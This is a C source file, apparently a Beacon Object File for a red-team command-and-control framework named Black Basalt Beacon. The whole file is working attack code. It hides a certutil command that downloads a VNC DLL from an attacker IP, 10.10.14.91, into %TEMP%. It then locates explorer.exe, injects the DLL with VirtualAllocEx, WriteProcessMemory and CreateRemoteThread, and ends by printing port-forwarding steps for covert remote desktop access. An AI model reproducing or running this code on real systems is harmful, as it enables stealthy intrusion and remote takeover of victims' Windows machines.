/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"

// ================================
// DIRECT IMPORTS
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_CloseHandle;

// ================================
// MANUAL DEFINITIONS
// ================================
#define TH32CS_SNAPPROCESS 0x00000002

typedef struct _PROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    CHAR szExeFile[260];
} PROCESSENTRY32, *LPPROCESSENTRY32;

// ================================
// HELPER FUNCTION: RUN HIDDEN COMMAND
// ================================
void execute_cmd_hidden(char* cmd) {
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) return;

    typedef BOOL (WINAPI *CREATEPROCESSA)(
        LPCSTR, LPSTR, LPVOID, LPVOID, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateProcessA");
    if (!pCreateProcessA) return;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (pCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        typedef DWORD (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
        WAITFORSINGLEOBJECT pWaitForSingleObject = (WAITFORSINGLEOBJECT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WaitForSingleObject");
        if (pWaitForSingleObject) {
            pWaitForSingleObject(pi.hProcess, 8000);
        }

        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hProcess);
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hThread);
    }
}

// ================================
// MAIN FUNCTION
// ================================
void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[VNC] Starting download and injection...");

    // === Step 1: Get %TEMP% ===
    typedef DWORD (WINAPI *GETENVVARA)(LPCSTR, LPSTR, DWORD);
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    GETENVVARA pGetEnvVarA = (GETENVVARA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "GetEnvironmentVariableA");

    char temp_path[512] = {0};
    char dll_path[512] = {0};

    if (!pGetEnvVarA || !pGetEnvVarA("TEMP", temp_path, sizeof(temp_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not get %%TEMP%%");
        return;
    }

    // snprintf replacement -> wsprintfA (NO CRT)
    // Load user32.dll and resolve wsprintfA dynamically
    HMODULE hUser32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("user32.dll");
    if (!hUser32) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not load user32.dll for wsprintfA");
        return;
    }

    typedef int (WINAPI *WSPRINTFA)(LPSTR, LPCSTR, ...);
    WSPRINTFA pwsprintfA = (WSPRINTFA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hUser32, "wsprintfA");
    if (!pwsprintfA) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not resolve wsprintfA");
        return;
    }

    pwsprintfA(dll_path, "%s\\winvnc.x64.dll", temp_path);

    // === Step 2: Download DLL ===
    char cmd[1024];
    pwsprintfA(cmd, "certutil -urlcache -split -f http://10.10.14.91/winvnc.x64.dll \"%s\"", dll_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Downloading: %s", cmd);
    execute_cmd_hidden(cmd);

    // === Step 3: Load Toolhelp32 dynamically ===
    typedef HANDLE (WINAPI *CREATE_SNAPSHOT)(DWORD, DWORD);
    typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);

    CREATE_SNAPSHOT pCreateToolhelp32Snapshot = (CREATE_SNAPSHOT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateToolhelp32Snapshot");
    PROCESS32FIRST pProcess32First = (PROCESS32FIRST)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Process32First");
    PROCESS32NEXT pProcess32Next = (PROCESS32NEXT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Process32Next");

    if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not resolve Toolhelp32 functions");
        return;
    }

    // === Step 4: Find explorer.exe ===
    HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Snapshot failed");
        return;
    }

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);
    DWORD target_pid = 0;

    if (pProcess32First(hSnapshot, &pe)) {
        do {
            if (pe.szExeFile[0] == 'e' && pe.szExeFile[1] == 'x' && pe.szExeFile[2] == 'p' &&
                pe.szExeFile[3] == 'l' && pe.szExeFile[4] == 'o' && pe.szExeFile[5] == 'r' &&
                pe.szExeFile[6] == 'e' && pe.szExeFile[7] == 'r' && pe.szExeFile[8] == '.' &&
                pe.szExeFile[9] == 'e' && pe.szExeFile[10] == 'x' && pe.szExeFile[11] == 'e' &&
                pe.szExeFile[12] == '\0') {

                target_pid = pe.th32ProcessID;
                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Found explorer.exe PID: %d", target_pid);
                break;
            }
        } while (pProcess32Next(hSnapshot, &pe));
    }

    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hSnapshot);

    if (target_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] explorer.exe not found");
        return;
    }

    // === Step 5: Open process ===
    typedef HANDLE (WINAPI *OPENPROCESS)(DWORD, BOOL, DWORD);
    OPENPROCESS pOpenProcess = (OPENPROCESS)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "OpenProcess");
    if (!pOpenProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] OpenProcess not available");
        return;
    }

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not open the process");
        return;
    }

    // === Step 6: Allocate memory for the path ===
    typedef LPVOID (WINAPI *VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    VIRTUALALLOCEX pVirtualAllocEx = (VIRTUALALLOCEX)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "VirtualAllocEx");

    LPVOID pRemoteMem = pVirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] VirtualAllocEx failed");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    // === Step 7: Write path ===
    typedef BOOL (WINAPI *WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    WRITEPROCESSMEMORY pWriteProcessMemory = (WRITEPROCESSMEMORY)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WriteProcessMemory");

    SIZE_T written;
    if (!pWriteProcessMemory(hProcess, pRemoteMem, dll_path, strlen(dll_path) + 1, &written)) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] WriteProcessMemory failed");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    // === Step 8: Inject LoadLibraryA ===
    typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;

    typedef HANDLE (WINAPI *CREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    CREATEREMOTETHREAD pCreateRemoteThread = (CREATEREMOTETHREAD)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateRemoteThread");

    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMem, 0, NULL);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] CreateRemoteThread failed");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] DLL injected into explorer.exe!");
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hThread);
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Run in Beacon:");
    BeaconPrintf(CALLBACK_OUTPUT, "    portfwd add 5900 127.0.0.1 5900");
    BeaconPrintf(CALLBACK_OUTPUT, "    Then connect with VNC Viewer to 127.0.0.1:5900");
}
